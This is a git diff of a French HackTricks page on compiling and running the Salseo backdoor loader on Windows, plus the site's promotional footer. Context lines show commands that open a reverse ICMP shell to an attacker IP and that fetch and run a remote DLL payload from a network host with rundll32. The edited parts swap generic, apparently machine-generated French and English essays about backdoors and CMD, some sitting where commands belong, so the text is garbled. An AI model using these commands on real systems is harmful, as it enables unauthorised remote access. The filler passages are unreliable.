@@ -45,7 +45,7 @@ Les backdoors peuvent être installés de différentes manières, notamment par 
 
 Il existe plusieurs outils et techniques pour détecter et supprimer les backdoors sur les systèmes Windows. Certains outils populaires incluent des scanners de vulnérabilités, des antivirus et des pare-feu. Il est également important de maintenir votre système à jour avec les derniers correctifs de sécurité pour réduire les risques d'exploitation de vulnérabilités connues.
 
-Pour prévenir les backdoors, il est essentiel de suivre de bonnes pratiques de sécurité, telles que l'utilisation de mots de passe forts, l'installation de logiciels provenant de sources fiables, la mise en place de pare-feu et la sensibilisation à la sécurité informatique. En outre, il est recommandé de réaliser régulièrement des audits de sécurité pour détecter et corriger les éventuelles vulnérabilités.
+Pour prévenir les backdoors, il est essentiel de suivre de bonnes pratiques de sécurité, telles que l'utilisation de mots de passe forts, l'installation de logiciels provenant de sources fiables, la mise en place de pare-feu et la sensibilisation à la sécurité informatique. En outre, il est recommandé de réaliser régulièrement des audits de sécurité pour détecter et corriger les vulnérabilités potentielles.
 
 En conclusion, les backdoors sont une menace sérieuse pour la sécurité des systèmes Windows. Il est essentiel de prendre des mesures pour les détecter, les prévenir et les éliminer afin de protéger vos informations sensibles et votre système contre les attaques.
 ```
@@ -99,9 +99,9 @@ SalseoLoader.exe password C:/Path/to/evilsalsa.dll.txt reverseicmp <Attacker-IP>
 
 Ouvrez le projet SalseoLoader à l'aide de Visual Studio.
 
-### Ajoutez avant la fonction principale : \[DllExport]
+### Ajoutez avant la fonction principale: \[DllExport]
 
-![](<../.gitbook/assets/image (2) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png>)
+![](<../.gitbook/assets/image (2) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png>)
 
 ### Installez DllExport pour ce projet
 
@@ -109,13 +109,13 @@ Ouvrez le projet SalseoLoader à l'aide de Visual Studio.
 
 ![](<../.gitbook/assets/image (3) (1) (1) (1) (1) (1) (1) (1) (1) (1).png>)
 
-#### **Recherchez le package DllExport (en utilisant l'onglet Parcourir) et appuyez sur Installer (et acceptez la fenêtre contextuelle)**
+#### **Recherchez le package DllExport (utilisez l'onglet Parcourir) et appuyez sur Installer (et acceptez la fenêtre contextuelle)**
 
 ![](<../.gitbook/assets/image (4) (1) (1) (1) (1) (1) (1).png>)
 
 Dans le dossier de votre projet, les fichiers suivants sont apparus : **DllExport.bat** et **DllExport\_Configure.bat**
 
-### **Désinstallez** DllExport
+### **Désinstallez DllExport**
 
 Appuyez sur **Désinstaller** (oui, c'est bizarre mais faites-moi confiance, c'est nécessaire)
 
@@ -174,23 +174,13 @@ rundll32.exe SalseoLoader.dll,main
 ```
 ### CMD
 
-CMD (Command Prompt) is a command-line interpreter for Windows operating systems. It provides a text-based interface for executing commands and performing various tasks. CMD can be used to navigate the file system, run programs, manage processes, and perform administrative tasks.
+CMD (Command Prompt) is a command-line interpreter for Windows operating systems. It provides a way to interact with the operating system by executing commands. CMD can be used to perform various tasks, such as navigating through directories, running programs, and managing files and processes.
 
-CMD is a powerful tool for hackers as it allows them to execute commands and scripts on a target system. By exploiting vulnerabilities or using social engineering techniques, hackers can gain access to a target system and use CMD to perform malicious activities.
+CMD is often used by hackers as a backdoor to gain unauthorized access to a system. By exploiting vulnerabilities or using social engineering techniques, hackers can execute malicious commands through CMD to compromise the security of a target system.
 
-Some common CMD commands used by hackers include:
+To protect against CMD backdoors, it is important to keep your system up to date with the latest security patches and to use strong passwords. Additionally, monitoring network traffic and implementing intrusion detection systems can help detect and prevent unauthorized access through CMD.
 
-- **netstat**: This command displays active network connections and listening ports on a system. Hackers can use this command to gather information about a target system's network activity.
-
-- **ipconfig**: This command displays the IP configuration of a system, including the IP address, subnet mask, and default gateway. Hackers can use this command to gather information about a target system's network configuration.
-
-- **tasklist**: This command displays a list of running processes on a system. Hackers can use this command to identify processes that may be vulnerable to exploitation.
-
-- **regedit**: This command opens the Windows Registry Editor, which allows hackers to modify registry keys and values. By modifying registry settings, hackers can gain persistence on a target system.
-
-- **shutdown**: This command allows hackers to shut down or restart a target system. By executing this command, hackers can disrupt the normal operation of a system.
-
-It is important to note that the use of CMD for malicious purposes is illegal and unethical. This information is provided for educational purposes only, to raise awareness about potential security risks and to promote responsible and ethical hacking practices.
+Remember, CMD can be a powerful tool when used responsibly, but in the wrong hands, it can be used to cause significant harm. Stay vigilant and take necessary precautions to protect your system from CMD-based attacks.
 ```
 set pass=password
 set payload=http://10.2.0.5/evilsalsax64.dll.txt
@@ -204,7 +194,7 @@ rundll32.exe SalseoLoader.dll,main
 <summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>
 
 * Travaillez-vous dans une **entreprise de cybersécurité** ? Voulez-vous voir votre **entreprise annoncée dans HackTricks** ? ou voulez-vous avoir accès à la **dernière version de PEASS ou télécharger HackTricks en PDF** ? Consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop) !
-* Découvrez [**La famille PEASS**](https://opensea.io/collection/the-peass-family), notre collection exclusive de [**NFTs**](https://opensea.io/collection/the-peass-family)
+* Découvrez [**La famille PEASS**](https://opensea.io/collection/the-peass-family), notre collection exclusive de [**NFT**](https://opensea.io/collection/the-peass-family)
 * Obtenez le [**swag officiel PEASS & HackTricks**](https://peass.creator-spring.com)
 * **Rejoignez le** [**💬**](https://emojipedia.org/speech-balloon/) [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe Telegram**](https://t.me/peass) ou **suivez** moi sur **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
 * **Partagez vos astuces de piratage en soumettant des PR au** [**repo hacktricks**](https://github.com/carlospolop/hacktricks) **et au** [**repo hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).
